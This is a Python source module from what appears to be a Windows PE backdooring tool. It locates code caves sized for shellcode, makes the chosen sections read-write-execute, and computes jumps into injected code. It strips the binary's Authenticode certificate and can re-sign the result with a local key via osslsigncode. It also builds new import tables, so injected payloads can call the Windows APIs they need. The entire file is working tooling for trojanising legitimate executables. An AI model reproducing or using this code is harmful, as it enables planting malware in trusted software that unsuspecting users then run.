import logging
import os
import re
import io
import struct
import operator
import pefile
from random import choice
import collections
from pe.core import winapi
from pe import pe_parse
import tempfile
import subprocess
import sys
logger = logging.getLogger(__name__)


class core:

    def __init__(self, incoming):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.core = incoming
        self.pickACave = {}
        self.CavesPicked = {}

    def get_magic(self):

        if self.core.pe_object['Magic'] == int('10B', 16):
            self.core.PAYLOAD_PATH_w_CHIP = self.core.PAYLOAD_PATH + 'x86/'
            self.core.PAYLOAD_PATH_CORE = self.core.PAYLOAD_PATH + \
                'x86/x86_core/'
            self.core.ENCODER_PATH = self.core.PAYLOAD_PATH + \
                'x86/encoder/'

            return True

        elif self.core.pe_object['Magic'] == int('20B', 16):
            self.core.PAYLOAD_PATH_w_CHIP = self.core.PAYLOAD_PATH + 'x64/'
            self.core.PAYLOAD_PATH_CORE = self.core.PAYLOAD_PATH + \
                'x64/x64_core/'
            self.core.ENCODER_PATH = self.core.PAYLOAD_PATH + \
                'x64/encoder/'

            return True

        else:
            logger.error("Unsupported chipset")

            return False

    def __find_cave__(self):

        logger.info("[*] Looking for caves that will fit the minimum "\
                    "shellcode length of %s" % self.core.SIZE_CAVE_TO_FIND)
        logger.info (f"[*] All caves lengths: {', '.join([str(i) for i in self.core.pe_object['len_allshells']])}")

        self.core.caveTracker = []

        caveSpecs = []
        # handing over 'loaded_binary' to a smaller variable and to closed
        # functions
        self.binary = io.BytesIO(self.core.pe_object['loaded_binary'].read(-1))
        self.core.pe_object['loaded_binary'].seek(0)
        self.binary.seek(0)

        for k, item in enumerate(sorted(self.core.pe_object['len_allshells'])):
            # print(self.core.options['CAVE_PATTERN'])
            cave_buffer = self.core.CAVE_PATTERN * (item + 8)

            p = re.compile(cave_buffer)
            self.binary.seek(0)
            for m in p.finditer(self.binary.read()):
                caveSpecs.append(m.start() + 4)
                caveSpecs.append(m.start() + item + 8)
                self.core.caveTracker.append(caveSpecs)
                caveSpecs = []
        self.binary.seek(0)

    def __align_caves__(self):

        for i, caves in enumerate(self.core.caveTracker):
            i += 1
            for section in self.core.pe_object['Sections']:
                sectionFound = False
                try:
                    if caves[0] >= section[4] and \
                       caves[1] <= (section[3] + section[4]) and \
                       caves[1] - caves[0] >= self.core.SIZE_CAVE_TO_FIND:
                        ''' TMI
                        logger.debug(f"Inserting code in this section: {section[0]}")
                        logger.debug(f'->Begin Cave: {hex(caves[0])}')
                        logger.debug(f'->End of Cave: {hex(caves[1])}')
                        logger.debug(f'Size of Cave (int): {caves[1] - caves[0]}')
                        logger.debug(f'SizeOfRawData: {hex(section[3])}')
                        logger.debug(f'PointerToRawData: {hex(section[4])}')
                        logger.debug(f'End of Raw Data: {hex(section[3] + section[4])}')
                        logger.debug(f'{"*" * 50}')
                        '''
                        JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                            5 - self.core.pe_object['PatchLocation'])

                        sectionFound = True
                        # Let's skip the text section
                        if section[0] == b'.text\x00\x00\x00':
                            continue
                        self.pickACave[i] = [section[0], hex(caves[0]),
                                             hex(caves[1]),
                                             caves[1] - caves[0],
                                             hex(section[4]),
                                             hex(section[3] + section[4]),
                                             JMPtoCodeAddress,
                                             section[1], section[2],
                                             section[9]]

                        break
                except Exception as e:
                    logger.info("-End of File Found..")
                    break
                ''' TMI
                if sectionFound is False:
                    logger.debug("No section")
                    logger.debug(f'->Begin Cave: {hex(caves[0])}')
                    logger.debug(f'->End of Cave {hex(caves[1])}')
                    logger.debug(f'Size of Cave (int) {caves[1] - caves[0]}')
                    logger.debug(f"{'*' * 50}")
                '''
                JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                    5 - self.core.pe_object['PatchLocation'])
                try:
                    self.pickACave[i] = [None, hex(caves[0]),
                                         hex(caves[1]),
                                         caves[1] - caves[0], None,
                                         None, JMPtoCodeAddress,
                                         caves, section[9]]
                except Exception as e:
                    logger.debug("EOF")

    def __change_section_flags__(self, section):
        """
        Changes the user selected section to RWE for successful execution
        """
        logger.info(f"[*] Changing flags for section: {section}")
        self.core.pe_object['newSectionFlags'] = int('e00000e0', 16)
        self.binary.seek(self.core.pe_object['BeginSections'], 0)
        for _ in range(self.core.pe_object['NumberOfSections']):
            sec_name = self.binary.read(8)
            if section in sec_name:
                self.binary.seek(28, 1)
                self.core.patch_instr[self.binary.tell()] = struct.pack('<I', self.core.pe_object['newSectionFlags'])
                #self.binary.write(struct.pack('<I', self.core.pe_object['newSectionFlags']))
                return
            else:
                self.binary.seek(32, 1)

    def remove_code_signing(self):
        """
        Zero cert table and truncate binary
        """

        # Typically called by pebin
        if self.core.pe_object['CertLOC'] != 0:
            binary = self.core.pe_object['loaded_binary']
            logger.info ("[*] Setting patch_instr for overwriting certificate table pointer")
            binary.seek(-self.core.pe_object['CertSize'], os.SEEK_END)
            self.core.patch_instr['truncate'] = binary.tell()
            binary.truncate()

            binary.seek(self.core.pe_object['CertTableLOC'], 0)
            self.core.patch_instr[self.core.pe_object['CertTableLOC']] = b"\x00\x00\x00\x00\x00\x00\x00\x00"
            binary.write(b"\x00\x00\x00\x00\x00\x00\x00\x00")
            binary.seek(0)

            return True
        else:
            # no certLoc
            return False

    def add_code_signing(self):
        fileToSign = tempfile.NamedTemporaryFile()
        signedFile = tempfile.NamedTemporaryFile().name

        passWord = open('certs/passFile.txt', 'r').readline().strip('\n')

        fileToSign.write(self.core.result.read())
        self.core.result.seek(0)

        p = subprocess.Popen(['osslsigncode', 'sign', '-certs', self.core.curdir + '/' + 'certs/signingCert.cer', '-key',
                              self.core.curdir + '/' + 'certs/signingPrivateKey.pem', '-n', 'Security','-in', fileToSign.name,
                              '-out', signedFile, '-pass', passWord],
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        p.wait()
        out, err = p.communicate()

        if b'succeeded' in out.lower():
            logger.info("[*] Code Signing Succeeded")
            # overwrite result
            # remove tmps
            self.core.result = io.BytesIO((open(signedFile, 'r+b').read()))
            os.remove(signedFile)
        else:
            logger.error("[!!!!] Code Signing Failed check your certs [!!!!]")
            logger.error(str(out).strip("\n"))
            self.core.result = False

        fileToSign.close()

    def update_checksum(self):
        '''
        Useful
        '''
        logger.info("[*] Updating PE file checksum")
        self.core.patched_binary.seek(0)
        pe = pefile.PE(data=self.core.patched_binary.read(-1), fast_load=True)
        logger.debug(f"Does the checksum checkout, before update: {pe.verify_checksum()}")
        checksum = pe.generate_checksum()
        logger.debug(f"PE Checksum: {checksum}")
        self.core.patched_binary.seek(self.core.pe_object['CheckSumLoC'], 0)
        self.core.patch_instr[self.core.patched_binary.tell()] = struct.pack('<I', checksum)
        self.core.patched_binary.write(struct.pack('<I', checksum))
        self.core.patched_binary.seek(0)

        if logger.getEffectiveLevel() == 10:
            self.core.patched_binary.seek(0)
            pe = pefile.PE(data=self.core.patched_binary.read(-1), fast_load=True)
            logger.debug(f"Does the checksum checkout? {pe.verify_checksum()}")
            self.core.patched_binary.seek(0)

    def manual(self, sectionName=None, sectionFlags=None, CaveNumber=None):
        self.__find_cave__()
        self.__align_caves__()

        logger.info ("############################################################\n"
               "The following caves can be used to inject code and possibly\n"
               "continue execution.\n"
               "**Don't like what you see? ignore or quit and view options.**\n"
               "############################################################")

        for k, item in enumerate(self.core.pe_object['len_allshells']):
            print("[*] Cave {0} length as int: {1}".format(k + 1, item))
            print("[*] Available caves: ")

            if self.pickACave == {}:
                print("[!!!!] No caves available! Use 'j' for cave jumping or")
                print("[!!!!] 'i' or 'q' for ignore.")
            for ref, details in self.pickACave.items():
                #print(details)

                if not details[0]:
                    continue

                if sectionFlags and details[9] and CaveNumber == k:
                    if sectionFlags != details[9]:
                        continue

                elif sectionName and details[0]:
                    # TODO: could add at RW check instead
                    if sectionName not in details[0]:
                        continue

                if details[3] >= item:
                    try:
                        print(str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
                                               "End: {5}; Cave begin: {1} End: {2}; "
                                               "Cave Size: {3}; Characteristics: {7}".format(details[0],
                                                                       details[1],
                                                                       details[2],
                                                                       details[3],
                                                                       details[4],
                                                                       details[5],
                                                                       details[6],
                                                                       hex(details[9])))
                        )
                    except Exception as e:
                        pass
            while True:

                print("*" * 50)

                if self.core.TESTING and self.core.TESTING_CAVES:
                    selection = self.core.TESTING_CAVES[k]
                else:
                    selection = input("[!] Enter your selection: ")

                try:
                    selection = int(selection)

                    print("[!] Using selection: %s" % selection)
                    try:
                        if self.core.options['CHANGE_ACCESS'] is True:
                            if self.pickACave[selection][0] is not None:
                                self.__change_section_flags__(self.pickACave[selection][0])
                        self.CavesPicked[k] = self.pickACave[selection]
                        break
                    except Exception as e:
                        print(Exception, e)
                        print("[!!!!] User selection beyond the bounds of available caves.")
                        print("[!!!!] Try a number or the following commands:")
                        print("[!!!!] ignore or i, quit or q")
                        print("[!!!!] TRY AGAIN.")
                        continue
                except Exception as e:
                    pass

                breakOutValues = ['ignore', 'quit', 'i', 'q']
                if selection.lower() in breakOutValues:
                    return selection

        self.core.pe_object['CavesPicked'] = self.CavesPicked
        return True

    def automatic(self, sectionName=None, sectionFlags=None, CaveNumber=None):
        self.__find_cave__()
        self.__align_caves__()

        # This is a mode modifier
        logger.info("[*] Attempting PE File Automatic Patching")

        # serialize caves:
        payloadDict = {}
        for k, item in enumerate(self.core.pe_object['len_allshells']):
            logger.debug("allshell: {k}, {item}")
            payloadDict[k] = item

        while True:
            availableCaves = {}
            # for tracking sections to change perms on
            trackSectionName = set()
            # remove sections with flags that we don't want on cave order
            # other caves first
            for ref in sorted(payloadDict.items(), key=operator.itemgetter(1),
                              reverse=True):
                # largest first
                # now drop the caves that are big enough in a set
                # and randomly select from it
                _tmpPickACave = {}
                for caveNumber, caveValues in self.pickACave.items():    
                    if caveValues[0] is None:
                        continue

                    elif sectionFlags and caveValues[9] and CaveNumber is None:

                        if sectionFlags != caveValues[9]:
                            continue

                    # this is so we can set flags required for a cave order
                    elif sectionFlags and caveValues[9] and ref[0] == CaveNumber:
                        if sectionFlags != caveValues[9]:
                            continue

                    elif sectionName and caveValues[0]:
                        # TODO: could add at RW check instead
                        if sectionName not in caveValues[0]:
                            continue

                    elif self.core.iat_cave_loc != 0:
                        if caveValues[0] <= self.core.iat_cave_loc[0] <= caveValues[1]:
                            continue
                    # stay clear of BDF.iat_cave_loc ending
                        if caveValues[0] <= self.core.iat_cave_loc[1] <= caveValues[1]:
                            continue

                    if caveValues[3] >= 50:

                        availableCaves[caveNumber] = caveValues[3]

                _tempCaves = {}
                if _tempCaves == {}:
                    # nothing? get out
                    for refnum, caveSize in availableCaves.items():
                        if caveSize >= ref[1]:
                            _tempCaves[refnum] = caveSize
                    if _tempCaves == {}:
                        break
                selection = choice(list(_tempCaves.keys()))
                logger.info(f"""\
            [!] Selected: {str(selection)}; Section Name: {self.pickACave[selection][0]}; \
            Cave begin: {self.pickACave[selection][1]}; \
            End: {self.pickACave[selection][2]}; \
            Cave Size: {self.pickACave[selection][3]}; \
            Payload Size: {ref[1]} \
            SectionFlags: {hex(self.pickACave[selection][9])}""")

                trackSectionName.add(self.pickACave[selection][0])
                # remove the selection from the dict
                popSet = set()
                for cave_ref, cave_vals in availableCaves.items():
                    if self.pickACave[cave_ref][1] <= self.pickACave[selection][1] <= self.pickACave[cave_ref][2] or \
                        self.pickACave[cave_ref][1] <= self.pickACave[selection][2] <= self.pickACave[cave_ref][2] or \
                        self.pickACave[selection][1] <= self.pickACave[cave_ref][1] <= self.pickACave[selection][2] or \
                        self.pickACave[selection][1] <= self.pickACave[cave_ref][2] <= self.pickACave[selection][2]:
                        popSet.add(cave_ref)
                for item in popSet:
                    availableCaves.pop(item)
                if selection in availableCaves.keys():
                    availableCaves.pop(selection)
                self.CavesPicked[ref[0]] = self.pickACave[selection]
            break

        # TO DO: this will need to be updated for the found_mode method
        # How do you bubble up the changed mode?

        if len(self.CavesPicked) != len(self.core.pe_object['len_allshells']):
            logger.warn("[!] Did not find suitable caves - try another method")
            if self.core.pe_object['cave_jumping'] is True:
                return 'single'
            else:
                return 'append'

        if self.core.options['CHANGE_ACCESS'] is True:
            for cave in trackSectionName:
                self.__change_section_flags__(cave)

        self.core.pe_object['CavesPicked'] = collections.OrderedDict(sorted(self.CavesPicked.items()))
        return True

    def check_apis(self):
        ####################################
        #### Parse imports via pefile ######

        # make this option only if a IAT based shellcode is selected
        logger.info("[*] Checking for APIs")
        # print(self.core.pe_object['loaded_binary'].read()[:2])
        pe = pefile.PE(data=self.core.pe_object['loaded_binary'].read(-1), fast_load=True)
        self.core.pe_object['loaded_binary'].seek(0)
        logger.info("[*] Parsing data directories")
        pe.parse_data_directories()
        self.core.pe_object['neededAPIs'] = set()
        try:
            for api in self.core.found_payload.apis_needed:

                apiFound = False
                for entry in pe.DIRECTORY_ENTRY_IMPORT:
                    for imp in entry.imports:
                        if imp.name is None:
                            continue
                        if imp.name.lower() == api.lower():
                            self.core.pe_object[api + b'Offset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
                            self.core.pe_object[api] = imp.address
                            apiFound = True
                if apiFound is False:
                    logger.debug(f"Need this {api}")
                    self.core.pe_object['neededAPIs'].add(api)

        except Exception as e:
            logger.error(f"[!] Check API Exception: {str(e)}")

        self.core.pe_object['ImportTableFileOffset'] = pe.get_physical_by_rva(self.core.pe_object['ImportTableRVA'])
        self.core.pe_object['loaded_binary'].seek(0)
        logger.debug(f"type(self.core.pe_object['loaded_binary']) {type(self.core.pe_object['loaded_binary'])}")

    def populate_iat_values(self):
        self.core.pe_object['iatdict'] = {}
        self.core.pe_object['thunkSectionSize'] = 0
        self.core.pe_object['lenDLLSection'] = 0
        self.core.pe_object['iatTransition'] = 0
        self.core.pe_object['dllCount'] = 0
        self.core.pe_object['apiCount'] = 0
        # The new section has three areas:
        # DLL names [DLL NAME][0x00] * Number of DLLs
        # thunkSection:
        # DLL1 THunk1: 0x11223344
        # DLL1 Thunk2: 0x11223355 0x00000000
        # DLL2 THunk1: 0x11223366
        # DLL2 Thunk2: 0x11223377 0x00000000
        # repeat thunkSection
        # each address for the thunk points to the API in the next section
        # [0x0000][DLL1 API1 NAME][0x00]
        # [0x0000][DLL1 API2 NAME][0x00]

        # have to sort this for testing
        list_apis = list(self.core.pe_object['neededAPIs'])
        if self.core.TESTING:
            list_apis.sort()
        for api in list_apis:
            logger.info("[!] Adding %s Thunk in new IAT" % api)
            # find DLL
            for aDLL, exports in winapi.winapi.items():
                # print(aDLL, exports)
                if aDLL not in self.core.pe_object['iatdict'] and api in exports:
                    logger.debug("iat_dict, {aDLL}, {api}, {self.core.pe_object['iatdict']}")
                    self.core.pe_object['lenDLLSection'] += len(aDLL) + 1
                    self.core.pe_object['iatdict'][aDLL] = {api: 0}
                    if self.core.pe_object['Magic'] == 0x20B:
                        self.core.pe_object['thunkSectionSize'] += 16
                    else:
                        self.core.pe_object['thunkSectionSize'] += 8
                    self.core.pe_object['iatTransition'] += 20
                    self.core.pe_object['dllCount'] += 1
                if api in exports:
                    self.core.pe_object['iatdict'][aDLL][api] = 0
                    if self.core.pe_object['Magic'] == 0x20B:
                        self.core.pe_object['thunkSectionSize'] += 16
                    else:
                        self.core.pe_object['thunkSectionSize'] += 8
                    self.core.pe_object['apiCount'] += 1

    def build_imports(self):

        # build first structure
        logger.info('Building imports')
        firstStructure = b''
        dllLen = 0
        sectionCount = 0
        for aDLL, api in self.core.pe_object['iatdict'].items():
            logger.debug(f'iatdict, {aDLL},{api}')
            logger.debug(f"""Break out: {self.core.pe_object['dllCount']}, {self.core.pe_object['lenDLLSection']},
                                                 {(self.core.pe_object['thunkSectionSize'] / 2)},
                                                 {self.core.pe_object['BeginningOfNewImports']}, {sectionCount}""")

            logger.debug(f"""firstStructure: {hex(int(self.core.pe_object['dllCount'] * 20 + self.core.pe_object['lenDLLSection'] +
                                                 (self.core.pe_object['thunkSectionSize'] / 2) +
                                                 self.core.pe_object['BeginningOfNewImports'] + 20 + sectionCount))}""")

            firstStructure += struct.pack("<I", int(self.core.pe_object['dllCount'] * 20 + self.core.pe_object['lenDLLSection'] +
                                                 (self.core.pe_object['thunkSectionSize'] / 2) +
                                                 self.core.pe_object['BeginningOfNewImports'] + 20 + sectionCount))
            firstStructure += (struct.pack("<Q", 0x000000000))
            firstStructure += struct.pack("<I", int(self.core.pe_object['dllCount'] * 20 +
                                                 self.core.pe_object['BeginningOfNewImports'] + 20 + dllLen))
            firstStructure += struct.pack("<I", int(self.core.pe_object['dllCount'] * 20 + self.core.pe_object['lenDLLSection'] +
                                                 self.core.pe_object['BeginningOfNewImports'] + 20 + sectionCount))
            dllLen = len(aDLL) + 1
            sectionCount += 16

        firstStructure += struct.pack("<QQI", 0x0, 0x0, 0x0)

        self.core.pe_object['iatTransition'] = firstStructure

        # build the transition section:
        # For each DLL in the New Import Table
        #    1. 1st Address points to the 2nd Thunk grouping's 1st DLL API Address
        #    2. 8 bytes of 00's
        #    3. Address points to the DLLName
        #    4. Address points to the 1st API thunk address group for the DLL API Address
        # 20 bytes of 00's
        #  Figure all the size of this structure
        #  Work backwards to populate
        # populate thunks

        newDLLSection = b''
        newthunkSection = b''
        newapiNameSection = b''

        apiOffset = (self.core.pe_object['lenDLLSection'] + self.core.pe_object['thunkSectionSize'] +
                     self.core.pe_object['BeginningOfNewImports'] + len(self.core.pe_object['iatTransition']))
        for aDLL, api in self.core.pe_object['iatdict'].items():
            logger.debug(f"{aDLL}, {api}")
            newDLLSection += aDLL + struct.pack("!B", 0x0)
            for apiName, address in api.items():
                newapiNameSection += struct.pack("<H", 0x0) + apiName + struct.pack("<B", 0x0)
                # api[apiName] = apiOffset
                if self.core.pe_object['Magic'] == 0x20B:
                    newthunkSection += struct.pack("<Q", apiOffset)
                else:
                    newthunkSection += struct.pack("<I", apiOffset)
                apiOffset += len(apiName) + 3
            if self.core.pe_object['Magic'] == 0x20B:
                newthunkSection += struct.pack("<Q", 0x0)
            else:
                newthunkSection += struct.pack("<I", 0x0)

        newthunkSection += newthunkSection

        self.core.pe_object['addedIAT'] = self.core.pe_object['iatTransition'] + newDLLSection + newthunkSection + newapiNameSection

    def patch_in_new_iat(self):
        # Update patch_instr

        logger.info("[*] Patching Import Directory Table into a code cave")

        self.populate_iat_values()
        binary = self.core.pe_object['loaded_binary']
        binary.seek(self.core.pe_object['ImportTableFileOffset'], 0)

        self.core.pe_object['Import_Directory_Table'] = b''

        while True:
            check_chars = b"\x00" * 20
            read_data = binary.read(20)
            if read_data == check_chars:
                # Found end of import directory
                break
            self.core.pe_object['Import_Directory_Table'] += read_data

        # get size of new iat
        newDLLSection = 0
        newapiNameSection = 0
        newthunkSection = 0
        firstStructure = 0

        for aDLL, api in self.core.pe_object['iatdict'].items():
            logger.debug(f"patch these, {aDLL},{api}")
            firstStructure += 4 + 8 + 4 + 4

        firstStructure += 8 + 8 + 4

        for aDLL, api in self.core.pe_object['iatdict'].items():
            newDLLSection += len(aDLL) + 1
            for apiName, address in api.items():
                newapiNameSection += 2 + len(apiName) + 1
                if self.core.pe_object['Magic'] == 0x20B:
                    newthunkSection += 8
                else:
                    newthunkSection += 4
            if self.core.pe_object['Magic'] == 0x20B:
                newthunkSection += 8
            else:
                newthunkSection += 4

        newthunkSection += newthunkSection

        self.core.pe_object['sizeNewIAT'] = newDLLSection + newapiNameSection + \
                                            newthunkSection + \
                                            len(self.core.pe_object['Import_Directory_Table']) + \
                                            firstStructure
        caveTracker = []
        caveSpecs = []
        RVA_offset = b''
        for section in self.core.pe_object['Sections']:
            if section[4] <= self.core.pe_object['ImportTableFileOffset'] <= section[4] + section[3]:
                self.core.pe_object['ImportTableInSectionRange'] = (section[4], section[3] + section[4], section[3])

        p = re.compile((self.core.pe_object['sizeNewIAT'] + 12) * b"\x00")
        binary.seek(self.core.pe_object['ImportTableInSectionRange'][0], 0)
        for m in p.finditer(binary.read()):
            caveSpecs.append(m.start() + self.core.pe_object['ImportTableInSectionRange'][0] + 8)
            caveSpecs.append(m.start() + self.core.pe_object['ImportTableInSectionRange'][0] + self.core.pe_object['sizeNewIAT'] + 12)
            caveTracker.append(caveSpecs)
            caveSpecs = []

        caveSpecs = []
        if caveTracker == []:
            logger.info("[!] no available caves for the IDT (IAT) Patching!")
            return False

        for section in self.core.pe_object['Sections']:
            if section[4] <= caveTracker[len(caveTracker) - 1][0] <= section[4] + section[3]:

                caveSpecs = caveTracker[len(caveTracker) - 1]
                RVA_offset = section[2] - section[4]

        #  self.iat_cave_loc is to reverse the space for patching later
        self.iat_cave_loc = caveSpecs
        self.core.pe_object['NewIAT_Loc'] = caveSpecs[0]

        binary.seek(self.core.pe_object['NewIAT_Loc'], 0)
        binary.write(self.core.pe_object['Import_Directory_Table'])
        # Add new imports
        self.core.pe_object['BeginningOfNewImports'] = RVA_offset + caveSpecs[0] + len(self.core.pe_object['Import_Directory_Table'])
        self.build_imports()
        binary.write(self.core.pe_object['addedIAT'])
        binary.seek(self.core.pe_object['ImportTableLOCInPEOptHdrs'], 0)
        # RVA...
        binary.write(struct.pack("<I", RVA_offset + self.core.pe_object['NewIAT_Loc']))
        binary.write(struct.pack("<I", (self.core.pe_object['ImportTableSize']) + self.core.pe_object['apiCount'] * 8 + 20))
        binary.seek(0)

        parser = pe_parse.pe_parse(FILE=binary)
        if parser.run():
            self.core.pe_object = parser.__dict__
            binary.seek(0)
            return True
        else:
            return False

    def create_new_iat(self):
        """
        Creates new import table for missing imports in a new section
        """
        # modify the iat_binary
        # Update patch_instr here
        logger.info("[*] Adding New Section for updated Import Table")
        logger.debug(f"type(self.core.pe_object['loaded_binary']) {type(self.core.pe_object['loaded_binary'])}")
        binary = self.core.pe_object['loaded_binary']
        logger.debug(f"type(binary) {type(binary)}")
        self.populate_iat_values()
        self.core.pe_object['NewSectionSize'] = 0x1000
        self.core.pe_object['SectionName_iat'] = b'rdata1'  # less than 7 chars
        # Not the best way to find the new section (update for appending when fix found)
        # newSetionPointerToRawData == last section pointer_to_rawdata and virtualsize
        self.core.pe_object['newSectionPointerToRawData_iat'] = self.core.pe_object['Sections'][-1][3] + self.core.pe_object['Sections'][-1][4]
        self.core.pe_object['VirtualSize_iat'] = self.core.pe_object['NewSectionSize']
        self.core.pe_object['SizeOfRawData_iat'] = self.core.pe_object['VirtualSize_iat']
        self.core.pe_object['NewSectionName_iat'] = b"." + self.core.pe_object['SectionName_iat']
        self.core.pe_object['newSectionFlags'] = int('C0000040', 16)
        #get file size
        filesize = self.core.pe_object['loaded_binary'].getbuffer().nbytes
        logger.debug(f"current filesize: {filesize}")
        logger.debug(f"Size of Image: {self.core.pe_object['SizeOfImage']}")
        if filesize > self.core.pe_object['SizeOfImage']:
            logger.error("[!] File has extra data after last section, cannot add new section")
            return False

        binary.seek(self.core.pe_object['pe_header_location'] + 6, 0)
        self.core.patch_instr[binary.tell()] = struct.pack('<H', self.core.pe_object['NumberOfSections'] + 1)
        binary.write(struct.pack('<H', self.core.pe_object['NumberOfSections'] + 1))

        binary.seek(self.core.pe_object['SizeOfImageLoc'], 0)
        self.core.pe_object['NewSizeOfImage'] = (self.core.pe_object['VirtualSize_iat'] +
                                         self.core.pe_object['SizeOfImage'])
        #print(f"{self.core.pe_object['NewSizeOfImage']=}")
        self.core.patch_instr[binary.tell()] = struct.pack('<I', self.core.pe_object['NewSizeOfImage'])
        binary.write(struct.pack('<I', self.core.pe_object['NewSizeOfImage']))

        binary.seek(self.core.pe_object['BoundImportLocation'])
        if self.core.pe_object['BoundImportLOCinCode'] != 0:
            self.core.patch_instr[binary.tell()] = struct.pack('<I', self.core.pe_object['BoundImportLOCinCode'] + 40)
            binary.write(struct.pack('<I', self.core.pe_object['BoundImportLOCinCode'] + 40))

        binary.seek(self.core.pe_object['BeginSections'] +
                         40 * self.core.pe_object['NumberOfSections'], 0)

        self.core.patch_instr[binary.tell()] = self.core.pe_object['NewSectionName_iat'] + \
                          b"\x00" * (8 - len(self.core.pe_object['NewSectionName_iat']))
        binary.write(self.core.pe_object['NewSectionName_iat'] +
                          b"\x00" * (8 - len(self.core.pe_object['NewSectionName_iat'])))

        self.core.patch_instr['VirtualSize_iat'] = struct.pack('<I', self.core.pe_object['VirtualSize_iat'])
        binary.write(struct.pack('<I', self.core.pe_object['VirtualSize_iat']))

        self.core.patch_instr['SizeOfImage_iat'] = struct.pack('<I', self.core.pe_object['SizeOfImage'])
        #print(f"{self.core.patch_instr['SizeOfImage']=}")
        binary.write(struct.pack('<I', self.core.pe_object['SizeOfImage']))

        self.core.patch_instr['SizeOfRawData_iat'] = struct.pack('<I', self.core.pe_object['SizeOfRawData_iat'])
        binary.write(struct.pack('<I', self.core.pe_object['SizeOfRawData_iat']))

        self.core.patch_instr['newSectionPointerToRawData_iat'] = struct.pack('<I', self.core.pe_object['newSectionPointerToRawData_iat'])
        binary.write(struct.pack('<I', self.core.pe_object['newSectionPointerToRawData_iat']))

        logger.debug(f"New Section PointerToRawData: {self.core.pe_object['newSectionPointerToRawData_iat']}")

        self.core.patch_instr['iat_new_section_padding1'] = struct.pack('<I', 0)
        binary.write(struct.pack('<I', 0))

        self.core.patch_instr['iat_new_section_padding2'] = struct.pack('<I', 0)
        binary.write(struct.pack('<I', 0))

        self.core.patch_instr['iat_new_section_padding3'] = struct.pack('<I', 0)
        binary.write(struct.pack('<I', 0))

        self.core.patch_instr['newSectionFlags_iat'] = struct.pack('<I', self.core.pe_object['newSectionFlags'])
        binary.write(struct.pack('<I', self.core.pe_object['newSectionFlags']))

        self.core.patch_instr['ImportTableALL_iat'] = self.core.pe_object['ImportTableALL']
        binary.write(self.core.pe_object['ImportTableALL'])

        binary.seek(self.core.pe_object['ImportTableFileOffset'], 0)
        # -20 here

        self.core.pe_object['Import_Directory_Table'] = b''

        while True:
            check_chars = b"\x00" * 20
            read_data = binary.read(20)
            if read_data == check_chars:
                #Found end of import directory
                break
            self.core.pe_object['Import_Directory_Table'] += read_data

        # self.core.pe_object['Import_Directory_Table'] = binary.read(self.core.pe_object['ImportTableSize'] - 20)

        binary.seek(self.core.pe_object['newSectionPointerToRawData_iat'], 0)  # moving to end of file
        #test write
        logger.debug(f'Import Table LOC {hex(binary.tell())}')
        self.core.patch_instr[binary.tell()] = self.core.pe_object['Import_Directory_Table']
        binary.write(self.core.pe_object['Import_Directory_Table'])

        # Add new imports
        self.core.pe_object['BeginningOfNewImports'] = self.core.pe_object['SizeOfImage'] + len(self.core.pe_object['Import_Directory_Table'])
        self.build_imports()
        #and remove here
        logger.debug(f"AddedIAT: {self.core.pe_object['addedIAT']}, {len(self.core.pe_object['addedIAT'])}")
        logger.debug(f'Import Table LOC: {hex(binary.tell())}')

        self.core.patch_instr['addedIAT'] = self.core.pe_object['addedIAT']
        binary.write(self.core.pe_object['addedIAT'])

        self.core.patch_instr['addedIAT_padding'] = struct.pack("<B", 0x0) * (self.core.pe_object['NewSectionSize'] -
                          len(self.core.pe_object['addedIAT']) - len(self.core.pe_object['Import_Directory_Table']))
        binary.write(struct.pack("<B", 0x0) * (self.core.pe_object['NewSectionSize'] -
                          len(self.core.pe_object['addedIAT']) - len(self.core.pe_object['Import_Directory_Table'])))

        binary.seek(self.core.pe_object['ImportTableLOCInPEOptHdrs'], 0)
        self.core.patch_instr[binary.tell()] = struct.pack('<I', self.core.pe_object['SizeOfImage'])
        binary.write(struct.pack('<I', self.core.pe_object['SizeOfImage']))

        self.core.patch_instr['totImportTablesize'] = struct.pack("<I", (self.core.pe_object['ImportTableSize']) + self.core.pe_object['apiCount'] * 8 + 20)
        binary.write(struct.pack("<I", (self.core.pe_object['ImportTableSize']) + self.core.pe_object['apiCount'] * 8 + 20))

        logger.debug("Loaded_binary LOC: {self.core.pe_object['loaded_binary'].tell()}")
        logger.debug(f"New filesize: {self.core.pe_object['loaded_binary'].getbuffer().nbytes}")
        logger.debug(f"New Binary filesize: {binary.getbuffer().nbytes}")

        binary.seek(0)

        parser = pe_parse.pe_parse(FILE=binary)

        # check to see if it passes pe parsing
        if parser.run():
            self.core.pe_object = parser.__dict__
            binary.seek(0)
            return True
        else:
            return False

    def iat_workflow(self):
        # Create working copy of binary for editing
        self.core.pe_object['loaded_binary'].seek(0)
        if 'IDT_IN_CAVE' not in self.core.options.keys():
            logger.error("Need IDT_IN_CAVE=True (or False) set")
            return False

        self.check_apis()

        iat_result = False
        logger.debug(f"IDT_IN_CAVE:{type(self.core.options['IDT_IN_CAVE'])}: {self.core.options['IDT_IN_CAVE']} ")
        if b"UPX".lower() in self.core.pe_object['textSectionName'].lower():
            logger.error("[!] Cannot patch a new IAT into a UPX binary at this time.")
            return False

        if self.core.pe_object['neededAPIs'] != set():
            if self.core.options['IDT_IN_CAVE'] == True:
                logger.info('[*] Patching IAT in existing cave')
                # Try to put new IAT in an existing code cave
                iat_result = self.patch_in_new_iat()
                if iat_result is False:
                    return False
                logger.info("[*] Checking updated IAT for thunks")
                self.check_apis()

        # if this IDT_IN_CAVE is true and it did not work... reset and go normal route
        if self.core.pe_object['neededAPIs'] != set():
            if self.core.options['IDT_IN_CAVE'] == True:
                logger.info("[!] Resetting the file")
                self.core.pe_object['loaded_binary'] =  io.BytesIO(self.core.original_binary.read(-1))
                logger.info(self.core.pe_object['loaded_binary'].tell())
                self.core.original_binary.seek(0)
                self.remove_code_signing()
                logger.info("[*] Creating new IAT in new PE section")
                iat_result = self.create_new_iat()
                if iat_result is False:
                    return False
                logger.info("[*] Checking updated IAT for thunks")
                self.check_apis()

        if self.core.pe_object['neededAPIs'] != set():
            if self.core.options['IDT_IN_CAVE'] == False:
                #reset the file
                logger.info('[*] Creating new IAT in new section IDT_IN_CAVE is False')
                iat_result = self.create_new_iat()
                if iat_result is False:

                    return False
                logger.info("[*] Checking updated IAT for thunks")
